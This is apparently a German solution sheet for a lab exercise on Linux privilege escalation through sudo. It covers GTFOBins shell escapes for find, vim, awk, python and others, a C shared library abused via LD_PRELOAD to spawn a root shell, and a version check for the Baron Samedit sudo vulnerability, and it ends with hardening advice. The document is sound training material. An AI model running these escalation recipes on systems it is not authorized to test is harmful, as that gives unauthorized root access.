# Lösung – Übung 03: Sudo & GTFOBins

## 1. sudo -l

```bash
sudo -l
```
```
User www-data may run the following commands:
    (ALL) NOPASSWD: /usr/bin/find
```

## 2. GTFOBins-Eskalation

GTFOBins → „find" → „Sudo":
```bash
sudo find . -exec /bin/sh \; -quit
# id -> uid=0(root)
```
Weitere Beispiele (je nach erlaubtem Binary):
```bash
sudo vim -c ':!/bin/sh'                  # vim
sudo less /etc/profile    # dann: !/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'     # awk
sudo python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'   # python
sudo nmap --interactive   # (alte nmap) -> !sh
sudo env /bin/sh          # env
```

## 3. LD_PRELOAD (wenn env_keep erlaubt)

`sudo -l` zeigt `env_keep+=LD_PRELOAD`:
```c
// shell.c
#include <stdlib.h>
#include <unistd.h>
void _init(){ setuid(0); system("/bin/sh"); }
```
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c
sudo LD_PRELOAD=/tmp/shell.so <erlaubtes_programm>   # lädt unsere lib als root -> root-shell
```

## 4. sudo-CVE prüfen

```bash
sudo --version        # z.B. 1.8.31
```
Versionen **< 1.9.5p2** sind für **Baron Samedit (CVE-2021-3156)** anfällig (Heap-Overflow via `sudoedit -s '\'`), unabhängig von sudoers → PoC vorhanden. Als Vektor notieren (nicht destruktiv ausführen ohne Snapshot).

## 5. Warum so häufig root

Fast jedes nicht-triviale Programm kann **Dateien lesen/schreiben oder Subprozesse starten**. Darf es als root laufen, lässt sich daraus eine root-Shell oder das Überschreiben sensibler Dateien ableiten. „Nur dieses eine Tool als root" ist deshalb meist = voller root.

## Härtung

- sudo-Regeln **minimal** und spezifisch; shell-/escape-fähige Binaries meiden oder mit `NOEXEC`.
- `env_reset` (Default) behalten, `LD_PRELOAD` **nicht** in `env_keep`.
- sudo aktuell halten (CVE-Patches); Kommando-Logging/`iolog`.

## Häufige Fehler / Troubleshooting

- **`sudo -l` fragt Passwort:** ohne Passwort nur bei `NOPASSWD`; sonst Passwort nötig.
- **GTFOBins-Payload scheitert:** exakt die „Sudo"-Variante nehmen (nicht „SUID"); Pfade/Flags prüfen.
- **root-Shell verliert Rechte:** `setuid(0)` nötig (manche Shells droppen) → GTFOBins-Rezept beachten.
- **LD_PRELOAD wirkungslos:** nur wenn `env_keep+=LD_PRELOAD` gesetzt ist.
